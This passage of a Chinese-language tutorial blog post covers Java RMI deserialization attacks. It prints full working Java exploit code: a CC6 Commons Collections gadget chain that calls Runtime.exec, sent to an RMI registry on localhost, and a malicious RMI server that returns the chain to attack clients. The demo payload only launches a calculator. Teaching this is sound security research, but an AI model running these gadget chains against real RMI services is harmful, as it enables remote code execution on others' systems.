+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">field0</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">UnicastRef</span><span class="w"> </span><span class="n">unicastRef</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">UnicastRef</span><span class="p">)</span><span class="n">field0</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">registry</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里获取到连接对象还需要获取到operations变量的值，如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Field</span><span class="w"> </span><span class="n">field1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">registry</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;operations&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">field0</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Operation</span><span class="o">[]</span><span class="w"> </span><span class="n">operation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Operation</span><span class="o">[]</span><span class="p">)</span><span class="n">field1</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">registry</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后直接拼接进恶意类即可，我这里使用CC6，注意点细节还是很好看懂的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">Rmi.Server</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">sun.rmi.server.UnicastRef</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutput</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.Registry</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.server.Operation</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.server.RemoteCall</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.server.RemoteObject</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashSet</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RMI_attack</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">fakeTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">1</span><span class="p">)};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">chainPart</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">}),</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">1</span><span class="p">)};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Transformer</span><span class="w"> </span><span class="n">chain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">fakeTransformer</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">HashMap</span><span class="w"> </span><span class="n">haha</span><span class="w"> </span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Map</span><span class="w"> </span><span class="n">lazy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">haha</span><span class="p">,</span><span class="n">chain</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">TiedMapEntry</span><span class="w"> </span><span class="n">outerMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TiedMapEntry</span><span class="p">(</span><span class="n">lazy</span><span class="p">,</span><span class="s">&#34;fupanc&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">HashSet</span><span class="w"> </span><span class="n">hashSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashSet</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">hashSet</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">outerMap</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">haha</span><span class="p">.</span><span class="na">remove</span><span class="p">(</span><span class="s">&#34;fupanc&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Field</span><span class="w"> </span><span class="n">field1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;iTransformers&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">field1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">field1</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">chain</span><span class="p">,</span><span class="n">chainPart</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="c1">//恶意发包</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Registry</span><span class="w"> </span><span class="n">registry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">getRegistry</span><span class="p">(</span><span class="s">&#34;127.0.0.1&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">1099</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="c1">//ref</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Field</span><span class="w"> </span><span class="n">field0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">registry</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getSuperclass</span><span class="p">().</span><span class="na">getSuperclass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;ref&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">field0</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">UnicastRef</span><span class="w"> </span><span class="n">unicastRef</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">UnicastRef</span><span class="p">)</span><span class="n">field0</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">registry</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="c1">//operation</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Field</span><span class="w"> </span><span class="n">field2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">registry</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;operations&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">field2</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Operation</span><span class="o">[]</span><span class="w"> </span><span class="n">operation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Operation</span><span class="o">[]</span><span class="p">)</span><span class="n">field2</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">registry</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">RemoteCall</span><span class="w"> </span><span class="n">var2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">unicastRef</span><span class="p">.</span><span class="na">newCall</span><span class="p">((</span><span class="n">RemoteObject</span><span class="p">)</span><span class="n">registry</span><span class="p">,</span><span class="w"> </span><span class="n">operation</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">,</span><span class="w"> </span><span class="n">4905912898345647071L</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ObjectOutput</span><span class="w"> </span><span class="n">var3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">var3</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">hashSet</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">unicastRef</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">var2</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="攻击client端">攻击Client端
+</h3><p>如果攻击的目标作为Client端，也就是在Registry/Server端可控时，也是可以导致攻击的。客户端主要有两个交互行为，第一是从Registry端获取调用服务的Stub 并反序列化，第二步是调用服务后获取执行结果并反序列化。</p>
+<p>有如下几个利用点：</p>
+<ul>
+<li>恶意Server Stub：</li>
+</ul>
+<p>Client端在Registry端lookup后拿到的在Server端在registry端注册的            代理对象并反序列化触发漏洞。</p>
+<ul>
+<li>恶意Server 端返回值</li>
+</ul>
+<p>就是Server端返回个iClient端恶意的返回值，Client端反序列化触发漏洞。</p>
+<ul>
+<li>动态类加载：</li>
+</ul>
+<p>同攻击Server端的动态类加载，Server端返回给Client端不存在的类，让Client端去codebase地址远程加载恶意类触发漏洞。</p>
+<p><strong>简单以Server端为例：</strong></p>
+<p>RemoteTest类代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">Rmi.Server</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.RemoteException</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.server.UnicastRemoteObject</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashSet</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RemoteTest</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">UnicastRemoteObject</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">RemoteInterface</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="nf">RemoteTest</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">RemoteException</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">sayHello</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">RemoteException</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;Hello welcome to use&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">sayName</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">RemoteException</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">fakeTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">1</span><span class="p">)};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">chainPart</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">}),</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">1</span><span class="p">)};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">chain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">fakeTransformer</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">haha</span><span class="w"> </span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">lazy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">haha</span><span class="p">,</span><span class="n">chain</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TiedMapEntry</span><span class="w"> </span><span class="n">outerMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TiedMapEntry</span><span class="p">(</span><span class="n">lazy</span><span class="p">,</span><span class="s">&#34;fupanc&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashSet</span><span class="w"> </span><span class="n">hashSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashSet</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashSet</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">outerMap</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">haha</span><span class="p">.</span><span class="na">remove</span><span class="p">(</span><span class="s">&#34;fupanc&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">field1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;iTransformers&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field1</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">chain</span><span class="p">,</span><span class="n">chainPart</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">Object</span><span class="p">)</span><span class="n">hashSet</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>接口哪些简单改改即可，然后客户端调用即可：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240919182427740.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240919182427740"
+	
+	
+></p>
+<p>成功反序列化。</p>
+<p>参考文章：</p>
